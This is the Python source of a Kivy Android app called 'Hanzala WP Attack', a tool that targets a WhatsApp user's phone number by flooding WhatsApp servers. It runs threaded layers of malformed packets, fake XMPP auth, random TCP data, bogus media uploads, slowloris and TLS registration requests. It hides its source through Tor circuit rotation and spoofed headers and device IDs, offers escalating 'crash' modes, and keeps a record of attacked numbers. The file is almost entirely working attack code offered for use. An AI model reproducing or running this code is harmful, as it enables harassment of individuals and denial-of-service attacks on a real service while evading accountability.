# main.py - Hanzala WP Attack APK
# 4 Mod + Ses + Arka Plan + Hafiza + Canli Analiz
# Pydroid 3 / APK icin

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.spinner import Spinner
from kivy.uix.progressbar import ProgressBar
from kivy.uix.scrollview import ScrollView
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.core.audio import SoundLoader
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.utils import get_color_from_hex
from kivy.metrics import dp, sp

import threading
import socket
import ssl
import struct
import time
import random
import os
import re
import hashlib
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# RENKLER
# ============================================================
BG = get_color_from_hex("#0A0A0A")
CARD = get_color_from_hex("#151515")
ACCENT = get_color_from_hex("#00FF88")
RED = get_color_from_hex("#FF0044")
YELLOW = get_color_from_hex("#FFD700")
WHITE = get_color_from_hex("#FFFFFF")
GRAY = get_color_from_hex("#888888")

Window.clearcolor = BG

# ============================================================
# TOR KONTROL
# ============================================================
try:
    import socks
    TOR_OK = True
except:
    TOR_OK = False

def tor_kontrol():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("127.0.0.1", 9050))
        s.close()
        return True
    except:
        return False

if TOR_OK and tor_kontrol():
    _orig = socket.socket
    def _tor(*args, **kwargs):
        s = socks.socksocket(*args, **kwargs)
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        return s
    socket.socket = _tor

def tor_yeni_devre():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", 9051))
        s.send(b'AUTHENTICATE ""\r\n')
        s.send(b"SIGNAL NEWNYM\r\n")
        s.send(b"QUIT\r\n")
        s.close()
        return True
    except:
        return False

# ============================================================
# SES YONETICI
# ============================================================
class Ses:
    def __init__(self):
        self.sound = None

    def cal(self, dosya="ses.mp3"):
        try:
            self.sound = SoundLoader.load(dosya)
            if self.sound:
                self.sound.loop = True
                self.sound.volume = 0.7
                self.sound.play()
                return True
        except Exception as e:
            print(f"[!] Ses hatasi: {e}")
        return False

    def durdur(self):
        if self.sound:
            self.sound.stop()

# ============================================================
# HAFIZA
# ============================================================
HAFIZA_DOSYA = "/tmp/.hanzala_hafiza.json"
BEKLEME = 48  # saat

def hafiza_yukle():
    if os.path.exists(HAFIZA_DOSYA):
        try:
            with open(HAFIZA_DOSYA, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def hafiza_kaydet(h):
    try:
        with open(HAFIZA_DOSYA, "w") as f:
            json.dump(h, f, indent=2)
    except:
        pass

def hafiza_kontrol(numara):
    h = hafiza_yukle()
    if numara in h:
        son = datetime.fromisoformat(h[numara]["son"])
        gecen = (datetime.now() - son).total_seconds() / 3600
        kalan = BEKLEME - gecen
        if gecen < BEKLEME:
            return False, gecen, kalan
    return True, 0, 0

def hafiza_ekle(numara, mod):
    h = hafiza_yukle()
    if numara not in h:
        h[numara] = {"ilk": datetime.now().isoformat(),
                     "son": datetime.now().isoformat(),
                     "sayi": 1, "modlar": [mod]}
    else:
        h[numara]["son"] = datetime.now().isoformat()
        h[numara]["sayi"] += 1
        h[numara]["modlar"].append(mod)
    hafiza_kaydet(h)

# ============================================================
# ANTI-FINGERPRINT
# ============================================================
UA = [
    "WhatsApp/2.23.24.76 Android/12",
    "WhatsApp/2.24.1.75 Android/13",
    "WhatsApp/2.23.19.82 iOS/16.5",
    "WhatsApp/2.24.3.78 iOS/17.0",
    "WhatsApp/2.24.5.80 Android/14",
    "WhatsApp/2.24.7.81 Android/13",
    "WhatsApp/2.24.9.83 iOS/17.1",
]

def rastgele_header():
    return {
        "User-Agent": random.choice(UA),
        "Accept": "*/*",
        "Accept-Language": random.choice(["tr-TR", "en-US", "de-DE", "fr-FR"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }

def rid(n=32):
    return hashlib.sha256(os.urandom(64)).hexdigest()[:n]

def sahte_cihaz():
    return {
        "device_id": rid(16),
        "imei": "".join(random.choices("0123456789", k=15)),
        "mac": ":".join("".join(random.choices("0123456789ABCDEF", k=2)) for _ in range(6)),
        "model": random.choice(["SM-G998B", "Pixel 7", "iPhone 14", "Xiaomi 13"]),
        "build": f"Android/{random.randint(10,14)}.{random.randint(0,9)}",
    }

# ============================================================
# ATTACK ENGINE - MAX GUC
# ============================================================
class Engine:
    def __init__(self, log_cb, prog_cb):
        self.log = log_cb
        self.prog = prog_cb
        self.aktif = False
        self.counter = 0
        self.fail = 0
        self.lock = threading.Lock()
        self.stats = {}
        self.cihaz = sahte_cihaz()
        self.wa_5222 = [f"e{i}.whatsapp.net" for i in range(1, 30)]
        self.wa_443 = [
            "mmg.whatsapp.net", "media.whatsapp.net", "pps.whatsapp.net",
            "dit.whatsapp.net", "g.whatsapp.net", "v.whatsapp.net",
            "web.whatsapp.com", "api.whatsapp.com", "chat.whatsapp.com",
            "registration.whatsapp.com", "static.whatsapp.net",
            "crashlogs.whatsapp.net", "faq.whatsapp.com", "graph.whatsapp.com",
            "business.whatsapp.com", "flows.whatsapp.net", "catalog.whatsapp.com",
        ]
        self.servers = [(h, 5222) for h in self.wa_5222] + [(h, 443) for h in self.wa_443]

    def _inc(self, k):
        with self.lock:
            self.counter += 1
            self.stats[k] = self.stats.get(k, 0) + 1

    def _fail(self):
        with self.lock:
            self.fail += 1

    # ============ KATMAN 1: MALFORMED ============
    def malformed(self, numara, adet=200):
        n = numara.encode()
        def worker(_):
            if not self.aktif: return
            try:
                host, port = random.choice(self.servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                for _ in range(random.randint(5, 12)):
                    fl = random.choice([0xFFFFFFFF, 0x7FFFFFFF, 0x80000000, 0xDEADBEEF, 0x00000000])
                    p = struct.pack(">B", random.choice([0x00, 0xFF, 0xED, 0x01]))
                    p += struct.pack(">I", fl)
                    p += os.urandom(random.randint(512, 4096))
                    p += n
                    s.send(p)
                time.sleep(0.01)
                s.close()
                self._inc("malformed")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=150) as ex:
            list(ex.map(worker, range(adet)))

    # ============ KATMAN 2: XMPP ============
    def xmpp(self, numara, adet=150):
        n = numara.replace("+", "")
        def worker(_):
            if not self.aktif: return
            try:
                host = random.choice(self.wa_5222)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, 5222))
                stream = f"<?xml version='1.0'?><stream:stream to='{host}' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
                s.send(stream.encode())
                for _ in range(random.randint(8, 15)):
                    auth = f"<auth mechanism='WAUTH-2' xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>{n}:{rid(32)}</auth>"
                    s.send(auth.encode())
                    s.send(b"<iq type='get' id='x'><query xmlns='jabber:iq:roster'/></iq>")
                time.sleep(0.05)
                s.close()
                self._inc("xmpp")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=120) as ex:
            list(ex.map(worker, range(adet)))

    # ============ KATMAN 3: TCP ============
    def tcp(self, numara, adet=150):
        def worker(_):
            if not self.aktif: return
            try:
                host, port = random.choice(self.servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                for _ in range(random.randint(3, 8)):
                    s.send(os.urandom(random.randint(256, 2048)))
                time.sleep(random.uniform(0.5, 2))
                s.close()
                self._inc("tcp")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=120) as ex:
            list(ex.map(worker, range(adet)))

    # ============ KATMAN 4: MEDIA ============
    def media(self, numara, adet=120):
        n = numara.replace("+", "")
        def worker(i):
            if not self.aktif: return
            try:
                host = random.choice(["mmg.whatsapp.net", "media.whatsapp.net", "pps.whatsapp.net"])
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, 443))
                ss = ctx.wrap_socket(s, server_hostname=host)
                body = random.choice([
                    b"\xFF\xD8\xFF\xE0" + os.urandom(4096),
                    b"\x89PNG\r\n\x1a\n" + os.urandom(4096),
                    b"\x00\x00\x00\x18ftypmp42" + os.urandom(4096),
                ])
                h = rastgele_header()
                hdr = "".join(f"{k}: {v}\r\n" for k, v in h.items())
                req = f"POST /mms/{random.choice(['image','video','audio'])}/{n}/{i} HTTP/1.1\r\nHost: {host}\r\n{hdr}Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body
                ss.send(req)
                time.sleep(0.05)
                ss.close()
                self._inc("media")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=100) as ex:
            list(ex.map(worker, range(adet)))

    # ============ KATMAN 5: SLOWLORIS ============
    def slowloris(self, numara, adet=100):
        n = numara.replace("+", "")
        def worker(_):
            if not self.aktif: return
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect(("web.whatsapp.com", 443))
                ss = ctx.wrap_socket(s, server_hostname="web.whatsapp.com")
                headers = [
                    f"GET /ws/{n} HTTP/1.1\r\n",
                    "Host: web.whatsapp.com\r\n",
                    "Upgrade: websocket\r\n",
                    "Connection: Upgrade\r\n",
                    f"Sec-WebSocket-Key: {rid(24)}\r\n",
                    "Sec-WebSocket-Version: 13\r\n",
                ]
                for h in headers:
                    ss.send(h.encode())
                    time.sleep(random.uniform(0.3, 1.0))
                time.sleep(random.uniform(5, 12))
                ss.close()
                self._inc("slowloris")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=80) as ex:
            list(ex.map(worker, range(adet)))

    # ============ KATMAN 6: TLS ============
    def tls(self, numara, adet=150):
        n = numara.replace("+", "")
        def worker(_):
            if not self.aktif: return
            try:
                host = random.choice(self.wa_443)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, 443))
                try:
                    ss = ctx.wrap_socket(s, server_hostname=host)
                    body = os.urandom(random.randint(512, 4096))
                    h = rastgele_header()
                    hdr = "".join(f"{k}: {v}\r\n" for k, v in h.items())
                    path = random.choice([f"/register/{n}", f"/verify/{n}", f"/auth/{n}"])
                    req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\n{hdr}Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body
                    ss.send(req)
                    time.sleep(0.05)
                    ss.close()
                except:
                    s.close()
                self._inc("tls")
            except:
                self._fail()
        with ThreadPoolExecutor(max_workers=120) as ex:
            list(ex.map(worker, range(adet)))

    # ============ ANA SALDIRI ============
    def attack(self, numara, mod, sure):
        self.aktif = True
        self.counter = 0
        self.fail = 0
        self.stats = {}
        self.log(f"[+] Hedef: {numara}")
        self.log(f"[+] Mod: {mod} | Sure: {sure}s")
        self.log(f"[+] Cihaz: {self.cihaz['model']}")
        self.log("[+] Yeni Tor devresi aliniyor...")
        tor_yeni_devre()
        time.sleep(2)

        if mod == "NORMAL":
            katmanlar = [("malformed", 100), ("xmpp", 60), ("tcp", 50)]
            dongu = 12
        elif mod == "GUCLU":
            katmanlar = [("malformed", 180), ("xmpp", 120), ("tcp", 100), ("tls", 100)]
            dongu = 22
        elif mod == "YIKICI":
            katmanlar = [("malformed", 280), ("xmpp", 180), ("tcp", 150), ("media", 120), ("tls", 150)]
            dongu = 35
        elif mod == "COKERT":
            katmanlar = [("malformed", 400), ("xmpp", 250), ("tcp", 200), ("media", 150), ("slowloris", 120), ("tls", 200)]
            dongu = 50

        baslangic = time.time()
        threadler = []
        for isim, adet in katmanlar:
            fonk = getattr(self, isim)
            t = threading.Thread(target=fonk, args=(numara, adet), daemon=True)
            t.start()
            threadler.append(t)

        son_rapor = 0
        while time.time() - baslangic < sure and self.aktif:
            simdi = time.time()
            if simdi - son_rapor >= 3:
                kalan = int(sure - (simdi - baslangic))
                self.prog(simdi - baslangic, sure)
                basari = (self.counter / (self.counter + self.fail) * 100) if (self.counter + self.fail) > 0 else 0
                self.log(f"[i] Kalan: {kalan}s | Paket: {self.counter} | Basari: {basari:.0f}%")
                son_rapor = simdi
            for _ in range(dongu):
                threading.Thread(target=self.malformed, args=(numara, 3), daemon=True).start()
            time.sleep(0.15)

        for t in threadler:
            t.join(timeout=0.5)

        self.aktif = False
        self.prog(sure, sure)
        basari = (self.counter / (self.counter + self.fail) * 100) if (self.counter + self.fail) > 0 else 0
        self.log(f"[+] BITTI | Toplam: {self.counter} | Fail: {self.fail}")
        self.log(f"[+] Basari: {basari:.1f}%")
        self.log(f"[+] En etkili: {max(self.stats.items(), key=lambda x: x[1])[0] if self.stats else '?'}")

    def durdur(self):
        self.aktif = False

# ============================================================
# UI
# ============================================================
class HanzalaUI(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.ses = Ses()
        self.engine = Engine(self.add_log, self.update_prog)
        self.sure = 15
        self.hafiza = hafiza_yukle()

        # Arka plan
        if os.path.exists("arkaplan.png"):
            self.bg = Image(source="arkaplan.png", allow_stretch=True,
                            keep_ratio=False, opacity=0.35, size_hint=(1, 1))
        elif os.path.exists("bg.png"):
            self.bg = Image(source="bg.png", allow_stretch=True,
                            keep_ratio=False, opacity=0.35, size_hint=(1, 1))
        else:
            self.bg = Image(allow_stretch=True, opacity=0.0, size_hint=(1, 1))
        self.add_widget(self.bg)

        # Ana içerik
        main = BoxLayout(orientation="vertical", padding=dp(15),
                         spacing=dp(10), size_hint=(1, 1))
        self.add_widget(main)

        # Başlık
        main.add_widget(Label(
            text="[b]HANZALA[/b]\n[b]WP ATTACK v7[/b]",
            markup=True, font_size=sp(26), color=ACCENT,
            size_hint_y=0.1, halign="center",
        ))

        # Numara
        self.numara_in = TextInput(
            hint_text="+905551234567", multiline=False,
            font_size=sp(18), background_color=CARD,
            foreground_color=WHITE, cursor_color=ACCENT,
            padding=[dp(15), dp(15)], size_hint_y=0.08,
            hint_text_color=GRAY,
        )
        main.add_widget(self.numara_in)

        # Mod
        self.mod_sp = Spinner(
            text="NORMAL",
            values=("NORMAL", "GUCLU", "YIKICI", "COKERT"),
            font_size=sp(18), background_color=CARD,
            color=ACCENT, size_hint_y=0.08,
        )
        self.mod_sp.bind(text=self._mod_degis)
        main.add_widget(self.mod_sp)

        # Süre
        main.add_widget(Label(
            text="Sure: 15s", font_size=sp(14),
            color=GRAY, size_hint_y=0.04,
        ))
        self.sure_label = main.children[-1]

        # Progress
        self.progress = ProgressBar(max=100, size_hint_y=0.04)
        main.add_widget(self.progress)

        # Durum
        self.durum = Label(text="HAZIR", font_size=sp(18),
                           color=ACCENT, size_hint_y=0.06, bold=True)
        main.add_widget(self.durum)

        # Butonlar
        btn = BoxLayout(size_hint_y=0.1, spacing=dp(10))
        self.start_btn = Button(text="BASLAT", font_size=sp(18),
                                background_color=ACCENT, color=BG, bold=True)
        self.start_btn.bind(on_press=self.baslat)
        btn.add_widget(self.start_btn)

        self.stop_btn = Button(text="DURDUR", font_size=sp(18),
                               background_color=RED, color=WHITE,
                               bold=True, disabled=True)
        self.stop_btn.bind(on_press=self.durdur)
        btn.add_widget(self.stop_btn)
        main.add_widget(btn)

        # Hafıza
        self.hafiza_btn = Button(text="HAFIZA", font_size=sp(14),
                                 background_color=CARD, color=YELLOW,
                                 size_hint_y=0.06)
        self.hafiza_btn.bind(on_press=self.hafiza_goster)
        main.add_widget(self.hafiza_btn)

        # Log
        scroll = ScrollView(size_hint_y=0.22)
        self.log_label = Label(
            text="[ Sistem hazir ]\n", markup=True,
            font_size=sp(11), color=GRAY,
            size_hint_y=None, halign="left", valign="top",
        )
        self.log_label.bind(texture_size=lambda *x: setattr(
            self.log_label, "height", self.log_label.texture_size[1]))
        scroll.add_widget(self.log_label)
        main.add_widget(scroll)

    def _mod_degis(self, spinner, text):
        self.sure = {"NORMAL": 15, "GUCLU": 30, "YIKICI": 45, "COKERT": 60}.get(text, 15)
        self.sure_label.text = f"Sure: {self.sure}s"

    def add_log(self, msg):
        Clock.schedule_once(lambda dt: self._log(msg), 0)

    def _log(self, msg):
        self.log_label.text += f"{msg}\n"

    def update_prog(self, gecen, toplam):
        Clock.schedule_once(lambda dt: setattr(
            self.progress, "value",
            min(gecen / toplam * 100, 100) if toplam > 0 else 0), 0)

    def baslat(self, instance):
        numara = self.numara_in.text.strip()
        if not numara:
            self._log("[!] Numara gir")
            return
        if not numara.startswith("+"):
            numara = "+" + numara
        if not re.match(r"^\+\d{7,15}$", numara):
            self._log("[!] Gecersiz numara")
            return

        # Hafıza
        uygun, gecen, kalan = hafiza_kontrol(numara)
        if not uygun:
            self._log(f"[!] Bu numaraya {gecen:.1f}s once saldirdin")
            self._log(f"[!] {kalan:.1f} saat bekle")
            self.durum.text = "ENGELLENDI"
            self.durum.color = RED
            return

        mod = self.mod_sp.text
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        self.durum.text = "SALDIRI AKTIF"
        self.durum.color = RED
        self.progress.value = 0
        self.log_label.text = f"[+] Hedef: {numara}\n[+] Mod: {mod}\n[+] Sure: {self.sure}s\n"

        def run():
            try:
                self.engine.attack(numara, mod, self.sure)
                hafiza_ekle(numara, mod)
                self.hafiza = hafiza_yukle()
                Clock.schedule_once(lambda dt: self._bitir(), 0)
            except Exception as e:
                self.add_log(f"[!] Hata: {e}")
                Clock.schedule_once(lambda dt: self._bitir(), 0)

        threading.Thread(target=run, daemon=True).start()

    def _bitir(self):
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
        self.durum.text = "BITTI"
        self.durum.color = ACCENT

    def durdur(self, instance):
        self.engine.durdur()
        self._log("[!] Durduruldu")
        self._bitir()

    def hafiza_goster(self, instance):
        if not self.hafiza:
            self._log("[+] Hafiza bos")
            return
        self._log("=== HAFIZA ===")
        for n, v in self.hafiza.items():
            son = datetime.fromisoformat(v["son"])
            gecen = (datetime.now() - son).total_seconds() / 3600
            kalan = max(0, BEKLEME - gecen)
            durum = "TEMIZ" if kalan <= 0 else f"BEKLE {kalan:.1f}s"
            self._log(f"{n} | {durum} | {v.get('sayi',1)} saldiri")

# ============================================================
# APP
# ============================================================
class HanzalaApp(App):
    def build(self):
        self.title = "Hanzala WP Attack"
        ui = HanzalaUI()
        # Ses çal
        Clock.schedule_once(lambda dt: ui.ses.cal("ses.mp3"), 1)
        return ui

if __name__ == "__main__":
    HanzalaApp().run()
